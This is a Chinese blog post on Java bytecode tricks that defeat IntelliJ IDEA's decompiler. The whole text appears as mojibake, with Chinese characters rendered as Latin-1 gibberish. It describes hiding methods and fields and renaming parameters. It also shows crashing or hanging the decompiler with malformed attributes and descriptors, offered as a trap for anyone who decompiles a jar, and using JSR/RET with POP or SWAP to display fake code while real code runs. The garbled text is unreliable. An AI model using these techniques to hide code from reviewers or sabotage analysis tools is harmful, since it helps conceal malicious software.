åœ¨ä¸‹å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œåªéœ€è¦æ»¡è¶³ä¸¤è€…ä»»ä¸€åˆ†æ”¯å³å¯ï¼Œå…¶ä¸­nameå‚æ•°ä»£è¡¨æ–¹æ³•å ä»¥ç¬¬ä¸€ä¸ªåˆ†æ”¯ä¸ºä¾‹å­ï¼Œæ–¹æ³•åä¸ºvaluesï¼Œç„¶åæè¿°ç¬¦æ»¡è¶³ä¸‹é¢çš„æƒ…å†µ å…¥å‚ä¸ºç©ºï¼Œè¿”å›å€¼ä¸ºå½“å‰å¯¹è±¡çš„æ•°ç»„ (å…¶ä¸­()ä»£è¡¨å…¥å‚ä¸ºç©ºï¼Œ[ä¸ºæ•°ç»„ï¼Œä¸­é—´çš„å˜é‡ä¸ºå…¨ç±»ååˆ©ç”¨æ–¹æ³•çš„é‡è½½) ç”šè‡³æ›´è¿›ä¸€æ­¥ï¼Œæˆ‘ä»¬å¯ä»¥ç»“åˆæ–¹æ³•é‡è½½çš„ç‰¹æ€§ï¼Œå†æä¸€ä¸ªåŒåæ–¹æ³•è¿·æƒ‘è§†çº¿ éšè—å­—æ®µåŒç†æ»¡è¶³ä»»ä¸€æ¡ä»¶å³å¯ isSyntheticå¹¶ä¸”REMOVE_SYNTHETICå±æ€§ä¸º1 åœ¨Hiddenmenmerså¯¹è±¡å½“ä¸­ isSyntheticisSyntheticæ¡ä»¶åŒä¸Šï¼Œä¿®é¥°ç¬¦æˆ–æ·»åŠ å±æ€§ï¼Œå…·ä½“å¯æŸ¥çœ‹æˆ‘çš„ä»£ç ï¼Œä½ç½®åœ¨src/main/java/hidden/field/Synthetic 123public boolean isSynthetic() &#123; return hasModifier(CodeConstants.ACC_SYNTHETIC) || hasAttribute(StructGeneralAttribute.ATTRIBUTE_SYNTHETIC);&#125; hiddenMemberså¯¹è±¡åŒç†ä»…é€‰ä¸€ä¸ªä¸ºä¾‹å­æ¼”ç¤º åœ¨org.jetbrains.java.decompiler.main.AssertProcessor#buildAssertionsä¸­å¯¹hiddenMembersæ·»åŠ äº†å­—æ®µå¯¹è±¡çš„å¤„ç†ï¼Œå¦‚æœfindAssertionFieldè¿”å›ä¸ä¸ºç©ºå³å¯å®ç°æ·»åŠ  æ¡ä»¶å¾ˆç®€å•å­—æ®µä¸ºStatic\\Final\\Syntheticä¿®é¥°å³å¯ 1cw.visitField(ACC_PUBLIC | ACC_STATIC | ACC_FINAL| ACC_SYNTHETIC, fieldName, &quot;Ljava/lang/String;&quot;, null, null); è¿è¡Œå‘ç°ï¼Œå­—æ®µä¹Ÿåšåˆ°äº†éšè—çš„æ•ˆæœ è‡ªå®šä¹‰æ–¹æ³•å‚æ•°ä¸€äº›éœ€è¦çŸ¥é“çš„åŸºç¡€çŸ¥è¯†Javaå­—èŠ‚ç çš„attribute_infoç”¨äºå­˜å‚¨ä¸ç±»ã€å­—æ®µã€æ–¹æ³•ã€ä»£ç ç­‰ç›¸å…³çš„é™„åŠ ä¿¡æ¯ã€‚å®ƒæ˜¯ä¸€ä¸ªå¯é€‰çš„éƒ¨åˆ†ï¼Œå¯ä»¥ç”¨æ¥æä¾›ä¸€äº›é¢å¤–çš„å…ƒæ•°æ®æˆ–è°ƒè¯•ä¿¡æ¯ã€‚ attribute_infoç»“æ„åŒ…å«ä»¥ä¸‹å‡ ä¸ªå­—æ®µï¼š attribute_name_indexï¼šä¸€ä¸ªæŒ‡å‘å¸¸é‡æ± ä¸­UTF-8ç±»å‹å¸¸é‡çš„ç´¢å¼•ï¼Œè¡¨ç¤ºattributeçš„åç§°ã€‚ attribute_lengthï¼šä¸€ä¸ªæ— ç¬¦å·çš„32ä½æ•´æ•°ï¼Œè¡¨ç¤ºattributeçš„é•¿åº¦ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚ infoï¼šåŒ…å«å®é™…çš„attributeä¿¡æ¯ã€‚ä¸åŒç±»å‹çš„attribute_infoå…·æœ‰ä¸åŒçš„æ ¼å¼å’Œä½œç”¨ã€‚å¸¸è§çš„attribute_infoç±»å‹åŒ…æ‹¬ï¼š JVMåœ¨è¿è¡Œæ—¶å¹¶ä¸ç›´æ¥å…³æ³¨å­—èŠ‚ç ä¸­çš„attributesï¼Œå®ƒä¸»è¦å…³æ³¨çš„æ˜¯å­—èŠ‚ç æŒ‡ä»¤å’Œè¿è¡Œæ—¶æ•°æ®ã€‚ è™½ç„¶JVMä¸ä¼šç›´æ¥å…³æ³¨attributesï¼Œä½†æ˜¯è¿™äº›attributesåœ¨è¿è¡Œæ—¶ä»ç„¶æœ‰ä¸€å®šçš„ä½œç”¨ã€‚ ä¾‹å¦‚ï¼ŒCode attributeä¸­åŒ…å«äº†æ–¹æ³•ä½“çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¼‚å¸¸å¤„ç†å™¨ã€å±€éƒ¨å˜é‡è¡¨ç­‰ä¿¡æ¯ã€‚JVMåœ¨æ‰§è¡Œæ–¹æ³•æ—¶ä¼šè§£æè¿™äº›å­—èŠ‚ç æŒ‡ä»¤ï¼Œå¹¶æ ¹æ®å¼‚å¸¸å¤„ç†å™¨å¤„ç†å¼‚å¸¸ï¼ŒåŒæ—¶ä¹Ÿä¼šä½¿ç”¨å±€éƒ¨å˜é‡è¡¨æ¥å­˜å‚¨æ–¹æ³•ä¸­çš„å±€éƒ¨å˜é‡ã€‚å¦å¤–ï¼ŒLineNumberTable attributeä¸­åŒ…å«äº†æºç è¡Œå·å’Œå­—èŠ‚ç è¡Œå·çš„å¯¹åº”å…³ç³»ï¼Œè¿™å¯¹äºè°ƒè¯•éå¸¸æœ‰ç”¨ã€‚å½“å‘ç”Ÿå¼‚å¸¸æˆ–è¿›è¡Œè¿½è¸ªæ—¶ï¼ŒJVMå¯ä»¥ä½¿ç”¨è¿™äº›ä¿¡æ¯æ¥æ˜¾ç¤ºæºç çš„è¡Œå·ï¼Œå¸®åŠ©å¼€å‘äººå‘˜è¿›è¡Œè°ƒè¯•ã€‚ METHOD_PARAMETERSæˆ‘ä»¬å¯ä»¥åœ¨ä»£ç ä¸­è‡ªå®šä¹‰ä¸€äº›è°ƒè¯•ä¿¡æ¯ï¼Œè¿™ä¸é»˜è®¤é…ç½®ä¸­çš„USE_METHOD_PARAMETERS/USE_DEBUG_VAR_NAMESæœ‰å…³ è¿™é‡Œæˆ‘ä»¬ä»…ä»…å…³æ³¨METHOD_PARAMETERSå³å¯ ä¸çŸ¥é“å¤§å®¶æœ‰æ²¡æœ‰å‘ç°ä¸€ä¸ªç°è±¡ï¼Œè‡ªå·±åœ¨IDEAå†™çš„ç±»ï¼Œåç¼–è¯‘åå¯ä»¥çœ‹åˆ°ï¼Œæ–¹æ³•çš„å‚æ•°åéƒ½æ˜¯æœ‰ä¸€äº›ç‰¹å®šå«ä¹‰çš„ ä½†æ˜¯ä»ç½‘ä¸Šä¸‹è½½çš„ä»£ç å´æ²¡æœ‰(å› ä¸ºè¢«åšäº†ä¼˜åŒ–å°†å±æ€§åšäº†ç§»é™¤) 12USE_DEBUG_VAR_NAMES(å¯¹åº”å¤„ç†org.jetbrains.java.decompiler.main.rels.ClassWrapper#applyDebugInfo)USE_METHOD_PARAMETERS(å¯¹åº”å¤„ç†org.jetbrains.java.decompiler.main.rels.ClassWrapper#applyParameterNames) ä»”ç»†é˜…è¯»ä»£ç ä½ ä¼šå‘ç°å…¶å®è¿™ä¸¤ä¸ªå‚æ•°æœ€ç»ˆæ•ˆæœæ˜¯ä¸€è‡´ï¼Œä½†æ˜¯USE_METHOD_PARAMETERSåœ¨IDEAçš„ä»£ç å±‚æ²¡æœ‰åšå‚æ•°çš„é™åˆ¶(jdk8æµ‹è¯•æ— ï¼Œä½†æ˜¯è¾ƒé«˜ç‰ˆæœ¬java[jdk&lt;=8u271]è¿è¡Œæ—¶ä¹Ÿæœ‰é™åˆ¶äº†ï¼Œé™åˆ¶æ¡ä»¶åŒUSE_DEBUG_VAR_NAMESï¼Œå½“ç„¶å…¶å®è¿™äº›é™åˆ¶éƒ½æ— æ‰€è°“)ï¼Œè€ŒUSE_DEBUG_VAR_NAMESåˆ™æœ‰ é€šè¿‡ç®€å•çš„fuzzå‘ç°é™åˆ¶è›®å¤§çš„(éƒ¨åˆ†è¾“å‡º) å› æ­¤ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä»¥USE_METHOD_PARAMETERSçš„æ„é€ ä¸ºä¸» æŸ¥çœ‹å®ƒçš„å¤„ç†æµç¨‹ï¼Œå…¶å®å¾ˆç®€å•ï¼Œè·å–æ–¹æ³•ä¸­çš„MethodParameterså±æ€§ï¼Œå†é€šè¿‡forå¾ªç¯ä¾¿åˆ©å»ºç«‹å­—æ®µçš„æ˜ å°„ æ—¢ç„¶é™åˆ¶æˆ‘ä»¬å·²ç»çŸ¥é“äº†IDEAæ˜¯å¦‚ä½•å¤„ç†çš„ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±éœ€è¦çŸ¥é“è¿™äº›å±æ€§æ˜¯å¦‚ä½•ä¼ å…¥ åœ¨ç±»çš„åˆå§‹åŒ–è§£æè¿‡ç¨‹å½“ä¸­ï¼Œå…¶ä¸­æ–¹æ³•å‚æ•°çš„è§£æåœ¨(org.jetbrains.java.decompiler.struct.attr.StructMethodParametersAttribute#initContent) å¯ä»¥çœ‹åˆ°å¦‚ä¸‹å›¾çš„è§£ææ­¥éª¤ï¼š è¯»å–æ–¹æ³•å‚æ•°ä¸ªæ•° è¯»å–æ–¹æ³•çš„å‚æ•°ååœ¨æœ¬åœ°å˜é‡è¡¨å½“ä¸­çš„æ˜ å°„(å…³é”®) è¯»å–æ–¹æ³•å‚æ•°ç±»å‹ é‚£ä¹ˆåœ¨æ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¼€å§‹æ„é€ å±æ€§ï¼Œç»§æ‰¿Attibuteç±»é‡å†™å…¶writeæ–¹æ³•æ¥å®ç°è‡ªå®šä¹‰çš„å†™å…¥ï¼Œè¿™é‡Œæˆ‘æ¯”è¾ƒå·æ‡’çš„å†™äº†ä¸€ä¸ªï¼Œèƒ½ç”¨å°±è¡Œ è°ƒç”¨mv.visitAttribute(new MethodParameterAttribute(3,5));å³å¯å®ç°å±æ€§æ·»åŠ  Ps:è€ç‰ˆæœ¬ä¼šæœ‰ä¸€ç‚¹BUGï¼Œå‡½æ•°åä¸­æ˜¾ç¤ºæ²¡é—®é¢˜ï¼Œåœ¨å…·ä½“å‡½æ•°åŠŸèƒ½ä¸­ä»ç»§ç»­ä½¿ç”¨äº†var0/var1/var2/varxxï¼Œè¿™é‡Œæˆ‘æ˜¯æœ€æ–°ç‰ˆIDEA åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„æ–¹æ³•å‚æ•°éƒ½è¢«æˆ‘ä»¬ä¿®æ”¹ä¸ºåŒä¸€åå­—ï¼Œå¤§å¤§åŠ å¤§äº†é˜…è¯»ç†è§£ä»£ç çš„éš¾åº¦ è™½ç„¶åœ¨è¾ƒé«˜ç‰ˆæœ¬ä¸­ä¹Ÿå¯¹fieldnameåšäº†é™åˆ¶ï¼Œä½†ä¹Ÿä¹Ÿåªæ˜¯ä¸€äº›ç‰¹æ®Šç¬¦å·çš„é™åˆ¶ï¼Œç®€å•å†™é¦–è¯—è¿˜æ˜¯å¯ä»¥çš„(å°çš®ä¸€ä¸‹),ä»¥jdk11ä¸ºä¾‹ (å¿½ç•¥é¢œè‰²å˜æˆç™½åº•äº†æ‰¾äº†å¼ è€å›¾æ‡’å¾—è‡ªå·±æ‰“å­—äº†) å±æ€§ä¸Šè¿˜èƒ½åšä»€ä¹ˆï¼Ÿä¸Šé¢ä¹Ÿæåˆ°äº†ï¼ŒJavaè¿è¡Œæ—¶ä¸€èˆ¬è€Œè¨€å¯¹å±æ€§æ²¡æœ‰ç›´æ¥çš„ä¾èµ–ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹æˆ‘ä»¬ä¾¿å¯ä»¥æƒ³æƒ³èƒ½ä¸èƒ½æ§åˆ¶å±æ€§è®©IDEAåœ¨åç¼–è¯‘çš„è¿‡ç¨‹ä¸­æŠ¥é”™å¯¼è‡´åç¼–è¯‘è¿‡ç¨‹æå‰ç»“æŸï¼Œå½“ç„¶å…¶å®æœ‰å¥½å‡ ç§åŠæ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ä»…ä»¥å…¶ä¸­ä¸€ä¸ªä¸ºä¾‹ï¼Œè¿™ä¸²ä»£ç å…¶å®å°±æ˜¯ä¸Šé¢è®²åˆ°çš„æ–¹æ³•å‚æ•°çš„å¤„ç†è¿‡ç¨‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªå¯¹md.params[i]çš„æ•°ç»„ä¸‹æ ‡å–å€¼çš„è¿‡ç¨‹ï¼Œè¿™æ—¶å€™å¦‚æœæˆ‘ä»¬å¤šåœ¨å±æ€§ä¸­æ·»åŠ ä¸€ä½ï¼Œå°±ä¼šå› ä¸ºå‘ç”Ÿç»„è¶Šç•Œå¯¼è‡´åç¼–è¯‘å¤±è´¥(æ¯”å¦‚ä¸€ä¸ªæ–¹æ³•æ‹¥æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬åœ¨å±æ€§ä¸­å£°æ˜å®ƒæ‹¥æœ‰å››ä¸ªå‚æ•°) æŸ¥çœ‹ä»£ç æ•ˆæœï¼Œæ­¤æ—¶åç¼–è¯‘å› å‡ºé”™æå‰é€€å‡ºï¼Œæ˜¾ç¤ºæ•ˆæœå¦‚å›¾ å†è¿›ä¸€æ­¥ï¼Œç®€å•ååˆ¶IDEAæ—¢ç„¶éƒ½çœ‹äº†æ–¹æ³•çš„å‚æ•°äº†ï¼Œé‚£ä¹ˆä¸å¦¨å†å¾€ä¸Šçœ‹çœ‹ï¼Œæ–¹æ³•å‚æ•°åˆæ˜¯æ€ä¹ˆè§£æçš„å‘¢ï¼Ÿ ä»…çœ‹è¿™ä¸€ä¸²ä»£ç ä½ èƒ½å‘ç°ä»€ä¹ˆä¹ˆï¼Ÿæ³¨æ„æˆ‘çš„å…‰æ ‡ ä»¥(Ljava/lang/String;)Ljava/lang/String;ä¸ºä¾‹ å…ˆè·å–æœ€åæ‹¬å·å†…çš„å†…å®¹ ç¬¬ä¸€ä½Lè¿›å…¥Case â€˜Lâ€™åˆ†æ”¯ è®© index ä¸º ; æ‰€åœ¨ä½ç½®ä¸‹æ ‡ è€Œå¦‚æœæˆ‘ä»¬ä¸å†™ä¸Šæœ€åä¸€ä¸ª;ç¬¦å·ï¼Œå¯¹javaæ¥è¯´ä¸€èˆ¬æ‰¾ä¸åˆ°é»˜è®¤ä¸º-1ï¼Œå¯¼è‡´åç¼–è¯‘æ°¸è¿œå¡åœ¨è¿™ä¸ªwhileå¾ªç¯å½“ä¸­ï¼Œå®ç°ä¸€ä¸ªDOSæ”»å‡» Psï¼šå¾ˆç‹—çš„æ˜¯å¾ˆæ—©ä¹‹å‰æˆ‘ç»™å®˜æ–¹æå‡ºäº†è¿™ä¸ªé—®é¢˜ï¼Œä»–ä»¬è¡¨ç¤ºå¹¶ä¸careä¹Ÿä¸ä¼šåšä¿®å¤ï¼Œä½†æ˜¯åœ¨æˆ‘å†™PPTå‰å‡ å¤©æ— æ„ä¸­æ›´æ–°äº†IDEAå‘ç°ä¼¼ä¹è¢«ä¿®å¤äº†ğŸ¶ï¼Œå…·ä½“åŸå› è¿˜æœªæŸ¥çœ‹(æ‡’) è¿™æ—¶å€™æœ‰äººä¼šé—®ï¼Œæ—¢ç„¶éƒ½ç ´åäº†ç±»çš„å®Œæ•´æ€§ï¼Œé‚£ä¹ˆè‚¯å®šéƒ½æ— æ³•è¿è¡Œäº†ï¼Œç¡®å®å¦‚æ­¤ï¼Œä½†æ˜¯æ¢ä¸ªè§’åº¦ï¼Œå¦‚æœæˆ‘ä»¬å‘æˆ‘ä»¬çš„jaræ–‡ä»¶å½“ä¸­å­˜å…¥å¤šä¸ªè¿™æ ·çš„classï¼Œå½“æœ‰äººæƒ³åç¼–è¯‘jaræŸ¥çœ‹ä»£ç çš„æ—¶å€™ï¼Œä¸å°å¿ƒç‚¹åˆ°äº†è¿™ä¸ªç±»ï¼Œæ˜¯ä¸æ˜¯å°±ä¼šè§¦å‘å°æƒŠå–œ(æ‰‹åŠ¨ç‹—å¤´) è¿˜èƒ½éšè—ä»€ä¹ˆï¼Ÿ(ç¥å¥‡çš„JSR) åˆšåˆšæˆ‘ä»¬å·²ç»å®ç°äº†å¯¹æ–¹æ³•ä»¥åŠå­—æ®µçš„éšè—ï¼Œè¿˜èƒ½éšè—ä»€ä¹ˆå‘¢ï¼Ÿé€šè¿‡é˜…è¯»åç¼–è¯‘çš„æºç æˆ‘å‘ç°äº†ä¸ªæœ‰è¶£çš„æŒ‡ä»¤jsrï¼Œåœ¨è¿‡å»å®ƒæ˜¯å’ŒretæŒ‡ä»¤æˆå¯¹å‡ºç°ï¼Œç”¨äºå®ç°try-catchå½“ä¸­çš„finallyå¿«ï¼Œä½†éšç€jvmçš„å‘å±•åé¢è¢«ç§»é™¤äº†ï¼Œä½†æ˜¯javaçš„è¿è¡Œæœ‰ç€å‘ä¸‹å…¼å®¹çš„ç‰¹æ€§ï¼Œå› æ­¤æˆ‘ä»¬ä»ç„¶æ˜¯èƒ½ä½¿ç”¨è¿™ä¸ªæŒ‡ä»¤ astore æ ˆé¡¶å¼•ç”¨ç±»å‹ä¿å­˜åˆ°æœ¬åœ°å˜é‡ jsr è·³è½¬æŒ‡å®šåœ°å€ï¼Œå¹¶å‹å…¥ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ ret è¿”å›æŒ‡å®šçš„æŒ‡ä»¤åœ°å€ é¦–å…ˆé€šè¿‡ä¸‹é¢çš„ä¾‹å­å¸¦å¤§å®¶ç®€å•äº†è§£ä¸‹JSRçš„ä½¿ç”¨ï¼Œåœ¨è¿™é‡Œé€šè¿‡JSRè·³è½¬åˆ°äº†label1ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹å…¥æ ˆä¸­ï¼Œä¹‹åæ‰§è¡Œå®ŒCode Hereï¼Œæˆ‘ä»¬é€šè¿‡ASTOREå°†æ ˆä¸Šåœ°å€ä¿å­˜åˆ°æœ¬åœ°å˜é‡è¡¨å½“ä¸­æŒ‡å®šä½ç½®ï¼Œå¹¶é€šè¿‡RETæŒ‡ä»¤å®ç°å¯¹Continue Code Hereçš„ç»§ç»­æ‰§è¡Œ åˆ©ç”¨è¿™ä¸ªjsræˆ‘ä»¬èƒ½è¾¾åˆ°è¿™æ ·çš„æ··æ·†æ•ˆæœï¼Œå¯ä»¥çœ‹åˆ°å®é™…è¿è¡Œä¸æ˜¾ç¤ºä¸ç¬¦åˆ é‚£åˆ°åº•æ˜¯å¦‚ä½•åšåˆ°çš„å‘¢ï¼Ÿå¯ä»¥çœ‹åˆ°jsrçš„å¤„ç†æ˜¯åœ¨ä»£ç ç”ŸæˆCFGçš„è¿‡ç¨‹ä¸­ï¼Œåœ¨è¿™é‡Œä»…ä»…åªæ˜¯å¯¹JSR/RETåšäº†å¤„ç†(æ­£å¸¸æƒ…å†µä¸‹jsr/retçš„å‡ºç°æ˜¯æˆå¯¹çš„ï¼Œå¹¶ä¸”ä¸ä¼šæœ‰å…¶ä»–æŒ‡ä»¤) è°ƒç”¨æ ˆå¦‚ä¸‹ 1234setSubroutineEdges:374, ControlFlowGraphbuildBlocks:204, ControlFlowGraph&lt;init&gt;:44, ControlFlowGraphcodeToJava:74, MethodProcessorRunnable ä½†æ˜¯æ¯•ç«Ÿæˆ‘ä»¬æ˜¯é»‘å®¢ï¼Œæ€»æƒ³æä¸€äº›éªšæ“ä½œï¼Œé€šè¿‡å¯¹å­—èŠ‚ç æŒ‡ä»¤çš„ç¿»é˜…æˆ‘å‘ç°äº†ä¸¤ä¸ªæœ‰è¶£çš„æŒ‡ä»¤ pop/pop2 å¼¹å‡ºæ ˆé¡¶æ•°å€¼ swap æ ˆé¡¶æ•°å€¼äº¤æ¢ å› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥æ„é€ å‡ºè¿™æ ·çš„ASMä»£ç (Y4è®¡ç®—å™¨çš„åŸç†) ä»£ç çœŸå®æ‰§è¡Œä¸IDEAè§£æçš„å·®å¼‚æ€§é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹ä»£ç çš„çœŸå®æ‰§è¡Œè¿‡ç¨‹(æ‡’äº†ç›´æ¥å·æ¼”è®²æ—¶çš„PPTåŠ¨ç”») é¦–å…ˆé€šè¿‡JSRè·³è½¬åˆ°label1ï¼Œå¹¶å‘æ ˆä¸­å‹å…¥ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ æ¥ç€å†æ¬¡é€šè¿‡JSRè·³è½¬åˆ°label2ï¼Œå¹¶å‘æ ˆä¸­å‹å…¥ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ ä¹‹åæˆ‘ä»¬æ‰‹åŠ¨æ’å…¥äº†ä¸€ä¸ªPOPæŒ‡ä»¤çš„è°ƒç”¨ï¼ŒRA2è¢«å¼¹å‡ºï¼Œå› æ­¤æœ€ç»ˆRETæŒ‡ä»¤è¿”å›æ‰§è¡Œæ—¶ä¼šæ‰§è¡ŒReal Code Here é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å†çœ‹çœ‹IDEAçš„è§£æå¤„ç†ï¼Œé€šè¿‡ä¸¤æ¬¡JSRè·³è½¬å‹å…¥ä¸¤æ¡æŒ‡ä»¤è¿”å›åœ°å€ ç”±äºå¹¶æ²¡æœ‰å¯¹POPåšå¤„ç†ï¼Œå› æ­¤æœ€ç»ˆè¿”å›æ‰§è¡ŒRA2æ‰€æŒ‡å‘çš„Fake Code Here å› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨IDEAè§£æä¸çœŸå®æ‰§è¡Œçš„å·®å¼‚æ€§æ„é€ å‡ºè¿™æ ·çš„æ··æ·†ä¾‹å­ï¼Œå°†çœŸå®ä»£ç éšè—ï¼Œè™šå‡ä»£ç åšå±•ç¤ºè¾¾åˆ°ä¸€ä¸ªå¾ˆå¥½çš„æ··æ·†æ•ˆæœ(IDEAæ‰€æœ‰ç‰ˆæœ¬å‡å¯) SWAPåŒæ ·çš„é“ç†ï¼Œä»…æ¼”ç¤º é€šè¿‡ä¸¤æ¬¡JSRè·³è½¬å‹å…¥ä¸¤æ¡æŒ‡ä»¤è¿”å›åœ°å€ é€šè¿‡SWAPæŒ‡ä»¤äº¤æ¢åœ°å€ ç”Ÿæˆçš„ç±»è§¦å‘æŠ¥é”™æ— æ³•åç¼–è¯‘(æœ€æ–°ç‰ˆå¯ä»¥ï¼Œæ—§ç‰ˆä¸è¡Œï¼Œå…·ä½“ç‰ˆæœ¬æ‡’å¾—æµ‹) å…³æ³¨ç‰¹æ®Šçš„ç»“æ„é™¤äº†å…³æ³¨ç¨‹åºçš„ä¸€äº›é»˜è®¤é…ç½®ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†è§†çº¿èšç„¦åœ¨æ”¾åœ¨ä¸€äº›ç‰¹æ®Šçš„ç»“æ„ä¸Šé¢ï¼Œæ¯•ç«Ÿç»“æ„è¶Šç‰¹æ®Šï¼Œåç¼–è¯‘å™¨çš„å¤„ç†ä¹Ÿä¼šè¶Šå¤æ‚ã€‚ è¿™é‡Œæˆ‘ä»¬ä»…ä»¥try-catchæ¥ä¸¾ä¾‹ï¼Œé‚£try-catchä¸ºä»€ä¹ˆç‰¹æ®Šå‘¢ï¼Ÿ å¯¹äºæˆ‘ä»¬Javaè°ƒç”¨æ–¹æ³•è€Œè¨€æœ‰ä¸¤ç§æƒ…å†µï¼Œå¦‚æœæ–¹æ³•æ˜¯é™æ€æ–¹æ³•å°±å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œè€Œå¦‚æœæ–¹æ³•æ˜¯éé™æ€æ–¹æ³•é‚£ä¹ˆå°±éœ€è¦å…ˆå®ä¾‹åŒ–ä¸€ä¸ªç±»å†æ‰§è¡Œè°ƒç”¨ï¼Œè€Œå¦‚ä¸‹å›¾æ‰€ç¤ºExceptionè°ƒç”¨çš„æ–¹æ³•æ˜¯éé™æ€æ–¹æ³•ã€‚å› æ­¤å¯ä»¥çŒœæµ‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ç”Ÿæˆäº†è¿™ä¸€ä¸ªå¯¹è±¡å¹¶å­˜å…¥äº†æ ˆä¸­ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡javapæŒ‡ä»¤ç®€å•ä»astoreçš„å‰åè°ƒç”¨åšä¸€ä¸ªéªŒè¯ åœ¨è¿™é‡Œä¸ºäº†æ–¹ä¾¿å¤§å®¶æ›´ç›´è§‚çš„æ„Ÿå—ï¼Œæˆ‘å†™äº†ä¸€ä¸ªæ¨¡æ‹Ÿæ ˆä¸æœ¬åœ°å˜é‡è¡¨ä¹‹é—´å˜åŒ–å…³ç³»çš„ç¨‹åºï¼Œè¾“å‡ºå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ç¡®å®å¾ˆç›´è§‚çš„æœ‰ä¸€ä¸ªExceptionå¯¹è±¡çš„ç”Ÿæˆ åœ¨æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç®€å•äº†è§£ä¸‹javaè‡ªèº«ç”Ÿæˆçš„try-catchçš„å­—èŠ‚ç è¡¨ç¤ºï¼Œåœ¨è¿™é‡Œä¸ºäº†é˜²æ­¢ç¼–è¯‘ä¼˜åŒ–ï¼Œåœ¨æ¯ä¸ªæ‰§è¡Œä¸­æ’å…¥äº†ä¸€äº›è¾“å‡ºçš„å­—èŠ‚ç æŒ‡ä»¤åºåˆ— åœ¨è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™ä¸ªå¼‚å¸¸è¡¨ï¼Œè¿™ä¸ªå¼‚å¸¸è¡¨å®šä¹‰äº†å¼‚å¸¸å¤„ç†çš„èŒƒå›´ ä»æŒ‡ä»¤0-8ï¼Œå¦‚æœèƒ½æˆåŠŸæ‰§è¡Œä¸æŠ¥é”™ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨gotoè·³è½¬åˆ°æŒ‡ä»¤20ç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°ç¨‹åºé€€å‡º å¦‚æœåœ¨æŒ‡ä»¤0-8ä¹‹é—´è¿è¡Œäº§ç”Ÿäº†é”™è¯¯ï¼Œå°±ä¼šè·³è½¬åˆ°targetæŒ‡å‘çš„æŒ‡ä»¤11å»æ•è·å¼‚å¸¸å¤„ç†ï¼Œä»æŒ‡ä»¤11ç»§ç»­å¾€ä¸‹æ‰§è¡Œç›´åˆ°ç¨‹åºé€€å‡º åœ¨è¿™é‡Œä¸ºäº†æ–¹ä¾¿æ–°æ‰‹å¯¹æ¥ä¸‹æ¥æ··æ·†çš„ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åœ¨ä¸ä½¿ç”¨GOTOä»¥åŠä¸å¯¹ç»“æ„é¡ºåºåšè°ƒæ•´çš„æƒ…å†µä¸‹å®ç°è¿™ä¸ªtry-catchï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä»å³è¾¹æ¥çœ‹ï¼Œç¨‹åºæ‰§è¡Œçš„æµåŠ¨æ˜¯ä»startLabelæµå‘endLabelå¹¶é€šè¿‡returnè¿”å›ï¼Œä»handlerLabelæµå‘endLabelå¹¶é€šè¿‡returnè¿”å›ï¼Œé‚£ä¹ˆå¯ä»¥æ„é€ å¦‚å·¦å›¾æ‰€ç¤ºçš„ASMä»£ç ç‰‡æ®µ(å› ä¸ºä¸ä½¿ç”¨è·³è½¬HandlerLabelåªèƒ½ç»™å…¶æ’å…¥ä¸€ä¸ªRETURNä¿è¯ç¨‹åºæ­£å¸¸é€€å‡º) é‚£ä¹ˆæ—¢ç„¶çŸ¥é“äº†ç¨‹åºçš„æ‰§è¡Œæ–¹å‘éƒ½æ˜¯å‘ä¸‹æ‰§è¡Œå¹¶ä¸”æœ€ç»ˆé€šè¿‡RETURNæŒ‡ä»¤é€€å‡º é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å°±èƒ½å¤§èƒ†å‡è®¾ï¼Œåœ¨è¿™é‡Œå°†endLabelä¸‹çš„RETURNåšç§»é™¤ï¼Œé‚£ä¹ˆè‡³å°‘ä»è¡¨é¢ä¸Šçœ‹æ‰§è¡Œé¡ºåºæ˜¯æ²¡é—®é¢˜çš„ ä½†è¿™æ—¶å€™æˆ‘ä»¬å†è¿è¡Œç”Ÿæˆå¥½çš„ç¨‹åºï¼ŒæˆåŠŸå–œæä¸€ä¸ªVerifyErrorçš„æŠ¥é”™ï¼Œè¿™æ˜¯å› ä¸ºåœ¨æ‰§è¡Œå‰ï¼Œjavaä¼šå¯¹ç±»åšéªŒè¯ï¼Œå¦‚æœéªŒè¯é€šè¿‡æ‰èƒ½ç»§ç»­æ‰§è¡Œï¼Œåä¹‹æŠ›å‡ºå¼‚å¸¸å¹¶é€€å‡º 